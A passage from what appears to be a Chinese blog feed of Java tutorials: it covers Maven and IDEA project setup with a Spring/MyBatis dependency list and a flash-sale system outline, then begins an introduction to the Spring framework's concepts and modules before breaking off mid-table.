class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>声明 JDK 版本</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 注意添加到 profiles 标签域内 --&gt;</span>	 	</span><br><span class="line"><span class="comment">&lt;!--java版本--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>保存配置，在 powershell 中输入 maven 仓库更新指令 <code>mvn help:system</code>，出现</p>
<p><img data-src="https://i.loli.net/2021/01/23/XM3aFnUcZhSPYTx.png" alt="image-20210117125433386"></p>
<p>打开自建的仓库目录可见</p>
<p><img data-src="https://i.loli.net/2021/01/23/HLqREZaDslSkJKN.png" alt="image-20210117125507620"></p>
<p><strong><em>注意：</em></strong></p>
<p><em>这里下载的并不是所有将来可能会用到的 JAR ，以后若使用到未下载的 JAR 包，IDEA 会提示更新仓库（下面有讲到）</em></p>
<h1 id="IDEA-中使用-maven"><a href="#IDEA-中使用-maven" class="headerlink" title="IDEA 中使用 maven"></a>IDEA 中使用 maven</h1><p>新建项目并在其中添加 maven 框架依赖，选择使用原型创建</p>
<p><img data-src="https://i.loli.net/2021/01/23/hNb26QCnELSYaco.png" alt="image-20210117135153846"></p>
<p>使用自行解压的版本，不使用与 IDEA 绑定的版本</p>
<p><img data-src="https://i.loli.net/2021/01/23/VMqI8lEtf3YdH9u.png" alt="image-20210117135337657"></p>
<p>IDEA 中环境自动配置的 Servlet2.3 jsp 的 el 表达式是不工作的，手动更换版本，把 WEB-INF 下的 web.xml 更改为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee            http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>手动向 maven 的配置文件中添加相应的依赖，IDEA 添加时可能因为没有相应的 JAR 包而报错标红，但是并不影响，在全部添加完毕后点击 maven 的同步按钮就会自动的将需要的 JAR 包添加到本地目录里面。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 补全项目依赖 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--   1、日志 java 日志：slf4j，log4j，logback，common-logging</span></span><br><span class="line"><span class="comment">            slf4j 是规范/接口</span></span><br><span class="line"><span class="comment">            日志实现：log4j，logback，common-logging</span></span><br><span class="line"><span class="comment">            使用：slf4j + logback</span></span><br><span class="line"><span class="comment">            --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  添加 slf4j 依赖，不然 logback 不能用      --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  添加 logback-core 核心依赖      --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  添加 logback-classic 依赖，实现并整合 slf4j 接口      --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  2、添加数据库相关依赖     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.22<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  优化链接反馈      --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--  3、DAO层：MyBatis 依赖      --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--   MyBatis 自身实现的 Spring 依赖     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--  Servlet Web 相关依赖      --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  引入相关 jsp 标签      --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--  4、Spring 依赖      --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  1）核心依赖      --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.12.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.12.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.12.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  2) spring DAO 层依赖     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.12.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-tx<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.12.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--  3）spring web 相关依赖      --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.12.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.12.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--  4）spring test 相关依赖      --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.12.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="秒杀系统业务逻辑分析"><a href="#秒杀系统业务逻辑分析" class="headerlink" title="秒杀系统业务逻辑分析"></a>秒杀系统业务逻辑分析</h1><p><img data-src="https://i.loli.net/2021/01/23/fQqVFlYBsJStzpE.png" alt="image-20210117140035169"></p>
<p>核心部件是库存</p>
<p>用户 - &gt; 库存</p>
<p><img data-src="D:%5CBlog%5Csource%5C_posts%5C%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F.assets%5Cimage-20210117140208711.png" alt="image-20210117140208711"></p>
<p><img data-src="https://i.loli.net/2021/01/23/TkArOVjP8t6y5MF.png" alt="image-20210117140248451"></p>
<h1 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h1><p><img data-src="D:%5CBlog%5Csource%5C_posts%5C%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F.assets%5Cimage-20210117153222776.png" alt="image-20210117153222776"></p>
<p>也就是秒杀产生的高并发问题</p>
<h1 id="具体的实现"><a href="#具体的实现" class="headerlink" title="具体的实现"></a>具体的实现</h1><p>功能</p>
<p><img data-src="https://i.loli.net/2021/01/23/kDQdXo4WjOiJmw9.png" alt="image-20210117153825789"></p>
<p>DAO 的接口设计、数据库表的设计、如何通过 MyBatis 实现 DAO </p>
<p>Service 的接口设计，通过 Spring 去管理 Service 的接口、通过 Spring 的声明式事务控制简化 Service 层的事务控制</p>
<p>Web 设计、前端交互界面的设计</p>
]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Code Language</category>
        <category>Java</category>
        <category>Projects</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Projects</tag>
      </tags>
  </entry>
  <entry>
    <title>反射和注解</title>
    <url>/hexo-test/Information-Security-Study/Code-Language/Java/Java%20Spring/</url>
    <content><![CDATA[<h1 id="前置声明"><a href="#前置声明" class="headerlink" title="前置声明"></a>前置声明</h1><p>本文绝大部分文案来自 <a href="http://c.biancheng.net/view/4244.html" target="_blank" rel="noopener">C语言中文网</a></p>
<p>JUnit 单元测试文案来自 <a href="https://www.yiibai.com/junit/" target="_blank" rel="noopener">yiibai 网</a></p>
<h1 id="Ⅰ、什么是-Java-Spring"><a href="#Ⅰ、什么是-Java-Spring" class="headerlink" title="Ⅰ、什么是 Java Spring"></a>Ⅰ、什么是 Java Spring</h1><p>Spring 是分层的 JavaSE/EE full-stack 的轻量级开源框架，以 IoC  (Inverse of Control, 控制反转) 和 AOP (Aspect Oriented Programming, 面向切面编程) 为内核，使用基本的 JavaBean 完成以前只能 EJB 完成的工作，取代了 EJB  (Enterprise Java Beans)  的臃肿和低效的开发模式。</p>
<p>在实际开发中，通常服务器采用三层体系架构，分别为表现层（web）、业务逻辑层（service）、持久层（dao）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	EJB (Enterprise Java Beans) 是基于分布式事务处理的企业级应用程序的组件。Sun公司发布的文档中对EJB的定义是：EJB是用于开发和部署多层结构的、分布式的、面向对象的Java应用系统的跨平台的构件体系结构。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	在开发分布式系统时, 采用EJB可以使得开发商业应用系统变得容易, 应用系统可以在一个支持EJB的环境中开发, 开发完之后部署在其它的EJB环境中, 随着需求的改变, 应用系统可以不加修改地迁移到其它功能更强、更复杂的服务器上。EJB在系统实现业务逻辑层里面负责表示程序的逻辑和提供访问数据库的接口。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	控制反转（Inversion of Control，缩写为IoC），是面向对象编程中的一种设计原则，可以用来减低计算机代码之间的耦合度。其中最常见的方式叫做依赖注入（Dependency Injection，简称DI），还有一种方式叫“依赖查找”（Dependency Lookup）。通过控制反转，对象在被创建的时候，由一个调控系统内所有对象的外界实体将其所依赖的对象的引用传递给它。也可以说，依赖被注入到对象中。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="1、Spring-的优点"><a href="#1、Spring-的优点" class="headerlink" title="1、Spring 的优点"></a>1、Spring 的优点</h3><p><strong>1）方便解耦，简化开发</strong></p>
<p>Spring 就是一个大工厂，可以将所有的对象的创建和依赖关系的维护交给 Spring 管理。</p>
<p><strong>2）方便集成多种优秀的框架</strong></p>
<p>Spring 不排斥各种优秀的开源框架，其内部提供了对各种优秀框架（如 Struts2、 Hibernate、Mybatis 等）的直接支持。</p>
<p><strong>3）降低 Java EE API 的使用难度</strong></p>
<p>Spring 对 Java EE 开发中非常难用的一些 API （JDBC、JavaMail、远程调用等）进行了封装，使这些 API 应用的难度大大降低。</p>
<p><strong>4）方便程序的测试</strong></p>
<p>Spring 支持 JUnit4，可以通过注解方便的测试 Spring 程序。</p>
<p><strong>5）AOP 编程的支持</strong></p>
<p>Spring 提供面向切面编程，可以方便的实现对程序进行权限拦截和运行监控等功能。</p>
<p><strong>6）声明式事务的支持</strong></p>
<p>只需要通过配置就可以完成对事务的管理，无需手动编程</p>
<h1 id="Ⅱ、Spring-的体系结构"><a href="#Ⅱ、Spring-的体系结构" class="headerlink" title="Ⅱ、Spring 的体系结构"></a>Ⅱ、Spring 的体系结构</h1><p>Spring 框架采用分层架构，根据不同的功能被划分成了多个模块。</p>
<p><img data-src="https://i.loli.net/2021/01/23/gRMHhQiO7f3jUGu.gif" alt></p>
<h3 id="1、Data-Access-Integration（数据访问-集成）"><a href="#1、Data-Access-Integration（数据访问-集成）" class="headerlink" title="1、Data Access/Integration（数据访问/集成）"></a><strong>1、Data Access/Integration（数据访问/集成）</strong></h3><p>数据访问/集成层包括了 JDBC、ORM、JMS 和 Transactions 模块</p>
<ul>
<li>JDBC 模块：提供了一个 JDBC 的抽象层，大幅度减少了再开发过程中对数据库操作的编码。</li>
<li>ORM模块：对流行的对象关系映射 API，包括 JPA、JDO、Hibernate 和 iBatis 提供了集成层。</li>
<li>OXM 模块：提供了一个支持对象/XML 映射的抽象层实现，如 JAXB、Castor、XMLBeans、JiBX 和 XStream。</li>
<li>JMS 模块：指 Java 消息服务，包含的功能为生产和消费的信息。</li>
<li>Transactions 事务模块：支持编程和声明式事务管理实现特殊接口类，并为所有的 POJO。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	POJO（Plain Ordinary Java Object）简单的Java对象，实际就是普通JavaBeans，是为了避免和EJB混淆所创造的简称。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="2-Web-模块"><a href="#2-Web-模块" class="headerlink" title="2. Web 模块"></a>2. Web 模块</h3><p>Spring 的 Web 层包括 Web、<a href="http://c.biancheng.net/servlet/" target="_blank" rel="noopener">Servlet</a>、Struts 和 Portlet 组件，具体介绍如下。</p>
<ul>
<li>Web 模块：提供了基本的 Web 开发集成特性，例如多文件上传功能、使用的 Servlet 监听器的 IoC 容器初始化以及 Web 应用上下文。</li>
<li>Servlet模块：包括 Spring 模型—视图—控制器（MVC）实现 Web 应用程序。</li>
<li>Struts 模块：包含支持类内的 Spring 应用程序，集成了经典的 Struts Web 层。</li>
<li>Portlet 模块：提供了在 Portlet 环境中使用 MV C实现，类似 Web-Servlet 模块的功能。</li>
</ul>
<h3 id="3-Core-Container（核心容器）"><a href="#3-Core-Container（核心容器）" class="headerlink" title="3. Core Container（核心容器）"></a>3. Core Container（核心容器）</h3><p>Spring 的核心容器是其他模块建立的基础，由 Beans 模块、Core 核心模块、Context 上下文模块和 Expression Language 表达式语言模块组成，具体介绍如下。</p>
<ul>
<li>Beans 模块：提供了 BeanFactory，是工厂模式的经典实现，Spring 将管理对象称为 Bean。</li>
<li>Core 核心模块：提供了 Spring 框架的基本组成部分，包括 IoC 和 DI 功能。</li>
<li>Context 上下文模块：建立在核心和 Beans 模块的基础之上，它是访问定义和配置任何对象的媒介。ApplicationContext 接口是上下文模块的焦点。</li>
<li>Expression Language 模块：是运行时查询和操作对象图的强大的表达式语言。</li>
</ul>
<h3 id="4-其他模块"><a href="#4-其他模块" class="headerlink" title="4. 其他模块"></a>4. 其他模块</h3><p>Spring的其他模块还有 AOP、Aspects、Instrumentation 以及 Test 模块，具体介绍如下。</p>
<ul>
<li>AOP 模块：提供了面向切面编程实现，允许定义方法拦截器和切入点，将代码按照功能进行分离，以降低耦合性。</li>
<li>Aspects 模块：提供与 AspectJ 的集成，是一个功能强大且成熟的面向切面编程（AOP）框架。</li>
<li>Instrumentation 模块：提供了类工具的支持和类加载器的实现，可以在特定的应用服务器中使用。</li>
<li>Test 模块：支持 Spring 组件，使用 JUnit 或 TestNG 框架的测试。</li>
</ul>
<h1 id="Ⅲ、Spring-目录结构和基础-JAR-包介绍"><a href="#Ⅲ、Spring-目录结构和基础-JAR-包介绍" class="headerlink" title="Ⅲ、Spring 目录结构和基础 JAR 包介绍"></a>Ⅲ、Spring 目录结构和基础 JAR 包介绍</h1><p>Spring 下载链接：</p>
<ul>
<li><p><a href="https://spring.io/" target="_blank" rel="noopener">官网地址</a></p>
</li>
<li><p><a href="https://repo.spring.io/webapp/#/artifacts/browse/tree/General/libs-release-local/org/springframework/spring" target="_blank" rel="noopener">Spring仓库</a></p>
</li>
</ul>
<p>在稳定版 Spring 3.2.13中，解压后的目录结构：</p>
<p><img data-src="https://i.loli.net/2021/01/23/qnGsmEuL6r9fwXY.png" alt="Spring目录结构"></p>
<p>目录介绍：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td>docs</td>
<td align="left">包含 Spring 的 API 文档和开发规范</td>
</tr>
<tr>
<td>libs</td>
<td align="left">包含开发需要的 JAR 包和源码包</td>
</tr>
<tr>
<td>schema</td>
<td align="left">包含开发所需要的 schema 文件，在这些文件中定义了 Spring 相关配置文件的约束</td>
</tr>
</tbody></table>
<p>在 libs 目录中，包含了 Spring 框架提供的所有 JAR 文件，其中有四个 JAR 文件是 Spring 框架的基础包，分别对应 Spring 容器的四个模块，具体如表 2 所示：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>spring-core-3.2.13.RELEASE.jar</td>
<td>包含 Spring 框架基本的核心工具类，Spring 其他组件都要用到这个包中的类，是其他组件的基本核心。</td>
</tr>
<tr>
<td>spring-beans-3.2.13.RELEASE.jar</td>
<td>所有应用都要用到的，它包含访问配置文件、创建和管理 bean 以及进行 Inversion of Control（IoC）或者 Dependency Injection（DI）操作相关的所有类。</td>
</tr>
<tr>
<td>spring-context-3.2.13.RELEASE.jar</td>
